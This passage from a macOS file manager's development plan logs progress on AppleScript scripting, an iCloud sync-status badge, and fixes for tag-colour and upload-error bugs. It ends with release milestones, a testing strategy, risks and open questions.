  (Settings/Quit) that sit above the window chain. `reveal` never had the bug — it calls `navigate`
  directly, not through the responder chain.
- **`DirnexTests/ScriptingCommandsTests.swift`** — pins the fragile Swift↔`sdef` string bridge: each
  `@objc` class resolves and is an `NSScriptCommand`; every `sdef` `<cocoa class>` resolves to one;
  the `sdef`'s command names are exactly the `AutomationVerb` set; and the bundle's Info.plist carries
  the two scripting keys pointing at `Dirnex.sdef`. +5 app → **60 app**.
- `swift test` (753) + app `xcodebuild test` (60) green, swiftformat + swiftlint-strict clean. **VERIFIED
  LIVE** (fresh DerivedData build, launched from Terminal, `ps`-checked): `osascript … reveal
  "/…/left/hello.txt"` returned `true` and the active pane navigated to `left/` with the cursor on
  `hello.txt`; with Dirnex **backgrounded behind Finder**, `copy selection` returned `true`, copied
  `hello.txt` left→right, and brought Dirnex forward (proving the `tryToPerform` fix); `run operation
  "go.parent"` (id) walked the pane up and `"Show Hidden Files"` (title) toggled hidden; an unknown op
  raised the AppleScript error above. The **F5 button still copies** after being rerouted through the
  shared `runCommand` (no regression). **NEXT (closes M6):** the iCloud/provider sync-status column
  (`NSFileManager` ubiquity attrs / `NSMetadataQuery` for download state). Optional, not required by the
  box: an **App Intents / Shortcuts** surface layered on the same `Automation` core, and a user script's
  F-key binding (the bar + key handler already accept any command id — a UI field on the organizer + one
  `UserScript` field).

Progress (2026-07-17, M6 pass 16 — the cloud sync badge; **the last M6 box closes `[x]`, VERIFIED
LIVE against real iCloud files**): the sync state of a file now rides at the right edge of its name.
**No column, by decision** — the plan said "column" for this the same way it said it for tags, and
both times the word was written before anyone had looked at Finder. Looking settled it: Finder draws
the cloud at the **trailing edge of the Name column**, and when a file is both tagged and not
downloaded it draws **the dots first and the cloud outermost** (measured — a file was evicted with
`brctl evict`, tagged, opened in Finder's list view and zoomed into). A column of our own would be
blank for every row of every folder on a Mac with no provider, which is most folders on most Macs.
The tags box was reworded to match what it has actually shipped since pass 4.

**The probe came first, and it earned its keep four times over** (the pass-1 `git` / pass-3 tags
method: a real `brctl evict`ed file, a download sampled every 20 ms, a 60 MB upload):

- **`isUbiquitousItem` is the only honest discriminator.** A `.DS_Store` *inside* iCloud Drive
  reports `isUbiquitous == false` and yet answers `.current` for its downloading status — so keying
  off the status, the obvious first draft, badges a local-only file as a synced cloud file. Outside a
  container every attribute is `nil` instead.
- **The downloading status lies during a download.** Sampling a real `brctl download` showed
  `isDownloading == true` while the status still read `NotDownloaded`, flipping to `.current` ~0.7 s
  later. Consulting the status first paints "in the cloud" over a file that is actively arriving —
  so the boolean is asked first, and a test pins it.
- **`isUploading` is not what reports an upload.** It stayed `false` for the whole of a 60 MB upload
  while `isUploaded` was `false` throughout; the *pending* flag is the real signal.
- **`NSURL` caches resource values on the instance.** Polling one `URL` object reported
  `NotDownloaded` for 37 s after the file had finished arriving; a fresh `URL` each poll saw it in
  700 ms. `CloudSyncStorage` builds and drops its own `URL` per read and says why in a comment —
  this is a bug that would only ever appear as "the badge is stuck".
- Cost: one read **measured at ~24 µs**, over twice a tag's `getxattr` → ~2.5 s across 100k rows,
  against M1's 150 ms budget. Also: the percent-downloaded keys are **unavailable** through
  `resourceValues` on macOS (`NSMetadataQuery` only), which is what rules out a progress-pie badge.

Core (+18 → **771**): `Services/CloudSyncStatus.swift` — `CloudSyncStatus` (`upToDate`,
`notDownloaded`, `downloading`, `uploading`, `conflicted`, `failed`, `excluded`; `isNoteworthy`
keeps `.upToDate` from drawing, `isTransfer` drives the follow-up poll below) + `CloudItemAttributes`
whose `status` is the whole truth table, precedence documented and test-pinned (errors > conflicts >
**excluded** — an excluded file never uploads, so `isUploaded` is `false` on it forever and asking
about uploads first would badge it as eternally pending — > downloading > notDownloaded > uploading)
+ `CloudDownloadingStatus`, a raw-string enum pinning the system's own spellings so the mapping is
testable without a cloud file. `Services/CloudSyncStorage.swift` — the read, beside `FinderTagStorage`
because it touches the filesystem, local-only like it (`.unsupported` for an archive/SFTP path rather
than a false "not a cloud item"). **Naming**: `SyncStatus` was already taken by the sync-directories
diff classification, hence `CloudSyncStatus` throughout.

App (+8 → **68**): `CloudSyncStatusProvider` (`FinderTagProvider`'s twin — off-main, per-directory,
LRU-cached, debounced, published by notification) + `SyncBadgeView`/`SyncBadgeStyle` (SF Symbols,
system colours; the quiet states are `secondaryLabel` because a placeholder is *not* a problem) +
`PanelViewController+SyncStatus` + app-wide `AppPreferences.showSyncStatus` (default **on**) with a
`view.toggleSyncStatus` command, View-menu checkmark, ⌘K palette entry and Settings ▸ Panels toggle.
**THE design call that makes it free: the directory gate.** Tags have to look at every row to find
out, because a tag can be on any file anywhere; a cloud file cannot — it lives in a cloud folder, and
a cloud folder announces itself in **one** read (probed: `~/Library/Mobile Documents` and everything
under it report `isUbiquitous == true`). So an ordinary folder of 100k rows costs one read, not 100k.
The `~/Library/CloudStorage` clause beside it is documented as **unverified insurance** — no
third-party provider was installed to probe, and "where available" is the plan's own hedge.

**THE live-caught bug: the badge stuck on "downloading" forever.** Every other refresh here is driven
by a filesystem event, which is enough for a state the filesystem announces (evicted, materialized)
and *not* enough for a transfer: the last event of a download arrives while the file is still
arriving, so the scan it triggers sees `isDownloading`, paints the blue arrow — and nothing ever
fires again. Observed on a real 3 MB file. Fix: a snapshot with anything in flight asks itself again
a second later until nothing is (`scheduleFollowUp`), bounded both by "only while a transfer is
actually in progress on screen" and a 60-tick cap so a wedged provider can't become a busy-wait.
LIVE, after the fix: two evicted files badged, the synced one bare, `brctl download` → blue arrow →
badge **cleared on its own**; tag dot + cloud rendered in Finder's order; the View toggle collapsed
and restored them. GOTCHAS: the two additions tipped `PanelViewController.swift` to 502 lines (limit
500) and the new command tipped `CommandCatalog` past `type_body_length` — both fixed structurally
along each file's own existing seam (a new `PanelViewController+Render.swift`; the View group joined
the same-file extension that already holds Workspace/Window/Application) rather than by trimming
comments as pass 14 had to.

Found in passing, **not fixed** (it is the tags feature, not this one): **iCloud rewrites a tag's
stored colour.** Writing `Red\n6` to a file in iCloud Drive and reading it back seconds later yields
`Red\n1` — reproducible, twice, while the identical write to a local file keeps `6`. Finder still
draws the dot red (it looks the colour up by *name*, as the pass-3 core notes it does), and Dirnex
draws the stored colour → grey. So tag colours may be wrong on every tagged file in iCloud Drive.
Whether Finder's own tagging UI produces the same stored state is **untested** — the AppleScript
`label index` path writes only the legacy Finder-info byte, not `_kMDItemUserTags`, so it could not
answer the question. Worth a pass of its own: the provider already keeps the name → colour map
(`known`) that a fix would consult. → **Answered and fixed in pass 17 below: Finder's own UI does it
too, so it was every tagged file in iCloud Drive.**

Progress (2026-07-17, M6 pass 17 — the iCloud tag-colour bug from pass 16; **fixed, VERIFIED LIVE
side by side with Finder**): tag dots now take a colour from the tag's **name**, the way Finder does,
instead of from the byte the file stores.

**The probe answered pass 16's open question, and the answer was the bad one.** Tagging a file in
iCloud Drive **with Finder's own right-click ▸ Tags UI** stores `Red\n1`, not `Red\n6` — immediately,
not after a sync delay. So this was never about hand-written attributes: it is **every tagged file in
a user's iCloud Drive**. Three more things the probe established, each of which killed a cheaper fix:

- **The rewrite is colour-blind and name-blind.** Blue lands as `Blue\n1`; a custom purple `Zebra`
  lands as `Zebra\n1`. Every tag, whatever it is, ends up at colour **1**. Off iCloud the same writes
  keep their colour indefinitely (`Red\n6`, `Zebra\n3`).
- **There is no second opinion on the file.** The legacy `com.apple.FinderInfo` label byte is
  normalised to 1 too (read `…09 02 …` on all three probe files), so the pre-tags byte the core
  already knows how to read cannot rescue the colour.
- **Finder's own name → colour database is not readable.** It is not in `com.apple.finder`'s plist
  (`FavoriteTagNames` is just the stock seven); the `TagsCloudSerialNumber` key there hints at a
  private synced store, and a custom `Zebra` appears nowhere under `~/Library`. This confirms the
  pass-3 decision to accumulate sightings rather than depend on Finder's list — there is nothing to
  depend on.

Core: new `FinderTagIndex` in `FinderTag.swift` (+10 → **781 core**) — the app's honest
approximation of Finder's database. It works **only because the stock seven are constants**:
`FinderTag.systemTags` seeds it, so Red is 6 before a file is read and is never in doubt after, and a
sighting is refused the right to overwrite a stock name. App: `FinderTagProvider` hands it the map it
was already keeping (`known` → `index`, `record` → `learn`, `forget`, `knownTags`/`knownTagNames`
delegate) and exposes `resolve`; `PanelViewController+Tags.tags(for:)` resolves **at the point of
drawing**, deliberately not folding it into the snapshot — `FinderTagSnapshot` keeps meaning *what
the files say*, which is exactly what its hand-rolled `==` compares to decide a repaint.

**A second instance of the same bug, found while fixing the first — and this one wrote to disk.**
`PanelViewController+TagEditing.offeredTags` preferred "the spelling **and colour** the files
themselves carry over the learned one", so the ⌃T menu drew Red's swatch grey for an iCloud target.
Worse: that same `FinderTag` is the item's `representedObject`, i.e. the tag `toggleTag` **writes** —
so tagging an iCloud file and a local file Red together wrote `Red\n1` to the *local* file, where the
byte is not normalised and simply persists. The same leak arrives by plain copy: a tagged file copied
**out** of iCloud Drive lands locally carrying `Red\n1` forever. Resolving by name fixes the swatch,
the write, and the copied-out file's dot. Note the old comment was already at odds with the pass-3
core doc's own "a colour belongs to the NAME, system-wide, not to the file".

**THE judgement call: a grey sighting never displaces a colour already known** (`FinderTagIndex.learn`).
Grey is what iCloud normalises *to*, so it is the one reading indistinguishable from the provider
having eaten the real colour — and without the guard the fix would have **caused a regression**: a
custom `Zebra` seen purple on the Desktop and grey in iCloud Drive would land on whichever folder was
browsed last, flipping the Desktop's currently-correct dot to grey. Cost: genuinely recolouring a tag
*to* grey isn't picked up until relaunch (which reseeds from the first sighting). Stock tags never
reach this path — `learn` refuses them outright. Known edge, left alone: learning a colour does not
repaint a folder already scanned, so a custom tag's dot updates on that folder's next scan.

LIVE (both panes on screen, next to Finder): an iCloud folder whose **every** file stores colour 1
read blue / red / red correctly; a custom `Zebra` showed grey until the Desktop was scanned, then
turned **purple** on the iCloud file while the Desktop's stayed purple — the guard holding. ⌃T on an
iCloud target offered Red with a red swatch and a checkmark, Zebra in purple; toggling Red across a
mangled `Red\n1` file and a local one wrote **`Red\n6`** to disk; a file copied out of iCloud drew
red. All 781 core + 68 app tests green, `swiftlint --strict` clean.

**NEXT: M6 is closed.** Optional leftovers, none blocking: an **App Intents / Shortcuts** surface on
the `Automation` core, a user script's F-key binding (the bar + key handler already accept any
command id — an organizer field + one `UserScript` field), and the .gitignore-aware folder sizes from
pass 1. **M7 (release readiness) is next.**

### M7 — Release readiness (M)

- [ ] Sparkle 2 updates + appcast infrastructure; notarized DMG pipeline in CI
- [ ] Full Disk Access onboarding flow (detect, explain, deep-link to System Settings)
- [ ] First-run tour: palette-centric, 5 screens max
- [ ] Performance pass: instruments audit of M1 budgets on real dirty data
      (huge Downloads, node_modules, network volumes, iCloud placeholder files)
- [ ] Crash reporting (opt-in) + anonymized op-failure telemetry decision
- [ ] Docs site: keyboard reference generated from the action registry
- [ ] Private beta → public beta → 1.0

Exit: a stranger can download, pass FDA onboarding, and move files in under 3 minutes.

Progress (2026-07-17, M6 pass 18 — the red sync badge on every tag write; **fixed, VERIFIED LIVE
against real iCloud**): a user reported the sync badge flashing the **red `xmark.icloud`** for the
couple of seconds after applying a Finder tag, then settling — while the tag itself synced to their
phone fine. It was real, it was ours, and it was not about tags at all.

**Probed before writing a line of Swift** (a fresh `URL` per read, polling every 50 ms). iCloud
attaches `NSCocoaErrorDomain` **4355** `NSUbiquitousFileUbiquityServerNotAvailable` — *"Couldn't
access your iCloud account. The iCloud servers might be unreachable"* — to **every ordinary pending
upload**, on a healthy account, with the upload completing seconds later. Three samples, all healthy:

- a tag write: error appears with `isUploading=true, isUploaded=false` at the instant the tag lands,
  gone 1.5 s later;
- a **one-line content edit** — so this was never tag-specific, tagging is just the cheapest way for a
  file manager to start an upload;
- a **60 MB file**, where the error was already in the *first* sample, **before `isUploading` had even
  flipped true**.

So `CloudItemAttributes.status`'s first question — `if hasDownloadingError || hasUploadingError` —
was true for the whole of every upload, and errors are the top of the precedence. The red cross was
painted over every upload the user ever made, and `.uploading`'s blue arrow was **effectively dead
code**: unreachable on the one provider we can test against.

**THE fix: the presence of an error is not information; its identity is.** New core
`CloudTransferError` (`.serverUnavailable` / `.quotaExceeded` / `.itemUnavailable` / `.other`,
mapped from `(domain, code)` so 4355 in someone else's domain stays `.other`), and
`CloudItemAttributes` now carries `downloadingError`/`uploadingError` as classified values rather
than two Bools. Only an error that `isVerdict` yields `.failed`; `.serverUnavailable` falls through
to the transfer states — which is not a suppression but **the more honest reading**: a file whose
server is unreachable *is* waiting to upload, and that stays true whether the provider is quietly
retrying or the Mac is on a plane. It is `.failed` that was the lie. Same core-decides-meaning /
app-does-I/O split as `CloudDownloadingStatus`, and the codes are pinned by a test for the same
reason the status strings are.

The suppression is **per-error, not per-file**: a real `.itemUnavailable` alongside a routine
`.serverUnavailable` still fails, and a conflict mid-upload still reads `.conflicted` (both pinned).
`.quotaExceeded` — the one that genuinely demands a human — is untouched.

LIVE (the shipping reader + truth table driven against a real iCloud file, the user's exact gesture):
`upToDate` → **`uploading`** (`uling=true uploaded=false uploadErr=serverUnavailable`) → `upToDate`.
That middle line is precisely the window that used to read `failed`. 785 core + 70 app tests green,
swiftlint 0 violations, swiftformat clean.

**Worth remembering beyond this bug:** the pass-16 probe established what the attributes *say*; it did
not establish what they say during a **healthy** transfer, because the probes were an eviction and a
download — never a routine upload from a resting file. A truth table built only from interesting
samples encodes the boring case wrong, and the boring case is every row the user has.


## 5. Cross-cutting: testing strategy

| Layer | Approach |
|---|---|
| DirnexCore | Unit tests against generated fixtures; every operation tested for: success, cancel mid-flight, permission denied, disk full, source mutated during op |
| VFS backends | One shared conformance test suite run against every backend (Local, Archive, SFTP-against-docker) |
| Undo journal | Property tests: op + undo == original tree (compare via content hash) |
| Panels/keyboard | XCUITest smoke for the keyboard core; snapshot tests for panel rendering states |
| Performance | XCTest metrics gated in CI: 100k-dir list < 150 ms, filter keystroke < 16 ms, memory ceiling on huge dirs |

## 6. Risks

| Risk | Mitigation |
|---|---|
| SwiftUI temptation for panels degrades perf later | Decision locked in §2; perf budgets in CI make regressions loud |
| Undo journal correctness (the scariest feature) | Property tests from M2 day one; non-reversible ops explicitly marked in UI, never silently dropped |
| FSEvents refresh fighting the cursor/selection | DirectoryModel diffs snapshots and reapplies cursor by identity, not row index; test with high-churn fixture |
| Archive writes corrupting user data | Always rewrite to temp + atomic swap; never in-place |
| Full Disk Access friction kills onboarding | Dedicated flow in M7; app degrades gracefully (browse home dir) before grant |
| Scope creep before the feel is right | M1 exit criteria are the gate; nothing from M3+ starts until M1 feels great |

## 7. Open questions (decide by end of M1)

- Space key: TC uses it for select+dir-size, macOS muscle memory says Quick Look.
  Current plan: Space = select/size (TC), Cmd+Y and a palette action = Quick Look.
  Validate with real use in M1.
- Quick view panel shortcut (Ctrl+Q vs Cmd+Shift+Q) — Cmd+Q is untouchable.
- Tabs UI: native-style segmented tabs vs compact TC-style. Prototype both in M1.
- Name/brand check for "Dirnex" before public beta (M7).
